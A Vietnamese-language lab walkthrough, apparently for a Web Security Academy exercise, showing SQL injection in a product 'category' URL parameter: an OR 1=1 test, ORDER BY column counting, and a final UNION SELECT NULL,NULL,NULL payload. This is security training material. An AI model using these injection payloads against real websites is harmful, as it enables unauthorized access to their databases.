![Pasted image 20260521100404](images/Pasted%20image%2020260521100404.png)
# Tổng quan về lab
-Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào Corporate gifts thì ta thấy ở url:
```LINK
https://0a9f00f0032527bb83510fe2005d00c0.web-security-academy.net/filter?category=Corporate+gifts
```
Phần `category=Corporate+gifts` rất có mùi của SQLi ta thử thêm `'+OR+1=1`:
```LINK
https://0a9f00f0032527bb83510fe2005d00c0.web-security-academy.net/filter?category=Corporate+gifts%27+OR+1=1--
```
![Pasted image 20260521100759](images/Pasted%20image%2020260521100759.png)
Và nó hiện ra tất cả các sản phẩm 
=> 100% SQLi 
Quay lại với bài lab,mục tiêu của ta là dùng UNION SELECT trả về số cột với giá trị NULL

# Khai thác
Để khai thác ta cần biết số cột của bảng bằng `ORDER BY 1,2,3,....,n` nếu `ORDER BY n` bị lỗi chứng tỏ bảng có `n-1` cột.Bằng cách thêm `'+ORDER+BY+1,2,3--` vào url:
```LINK
https://0a9f00f0032527bb83510fe2005d00c0.web-security-academy.net/filter?category=Corporate+gifts%27+ORDER+BY+1--
và
https://0a9f00f0032527bb83510fe2005d00c0.web-security-academy.net/filter?category=Corporate+gifts%27+ORDER+BY+2--
và
https://0a9f00f0032527bb83510fe2005d00c0.web-security-academy.net/filter?category=Corporate+gifts%27+ORDER+BY+3--
```
Lúc này:
`'+ORDER+BY+1--`:
![Pasted image 20260521101657](images/Pasted%20image%2020260521101657.png)
`'+ORDER+BY+2--`:
![Pasted image 20260521101803](images/Pasted%20image%2020260521101803.png)
`'+ORDER+BY+3--`:
![Pasted image 20260521101929](images/Pasted%20image%2020260521101929.png)
Nhưng khi đến `'+ORDER+BY+4--`:
![Pasted image 20260521102023](images/Pasted%20image%2020260521102023.png)
Việc server truy vấn đến database thất bại nên gặp lỗi 
=> câu lệnh truy vấn UNION SELECT sẽ có 3 cột
Cuối cùng ta add vào url `'+UNION+SELECT+NULL,NULL,NULL--`
```LINK
https://0a9f00f0032527bb83510fe2005d00c0.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+NULL,NULL,NULL--
```
=> SOLVED

